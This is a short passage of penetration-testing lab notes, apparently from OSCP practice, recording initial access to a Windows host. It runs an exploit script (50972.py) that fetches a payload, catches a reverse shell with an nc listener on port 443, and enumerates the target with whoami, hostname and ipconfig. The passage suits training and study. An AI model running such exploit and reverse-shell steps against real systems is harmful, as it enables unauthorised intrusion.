└─$ python3 50972.py 192.168.143.145 192.168.45.186 shell.exe

\[+\] 3..2..1..

\[+\] *Super fast hacker typing*

\[+\] Retrieving payload

\[+\] Done! Check Your Listener?

![[Initial Access image 60.png]]

└─$ rlwrap -cAr nc -lvnp 443

listening on \[any\] 443 ...

connect to \[192.168.45.186\] from (UNKNOWN) \[192.168.143.145\] 50080

Microsoft Windows \[Version 10.0.19041.1\]

(c) 2019 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami

whoami

oscp\offsec

C:\WINDOWS\system32>hostname

hostname

oscp

C:\WINDOWS\system32>ipconfig

ipconfig

Windows IP Configuration

Ethernet adapter Ethernet0:

Connection-specific DNS Suffix  . :

IPv4 Address. . . . . . . . . . . : 192.168.143.145

Subnet Mask . . . . . . . . . . . : 255.255.255.0

Default Gateway . . . . . . . . . : 192.168.143.254

![[Initial Access image 61.png]]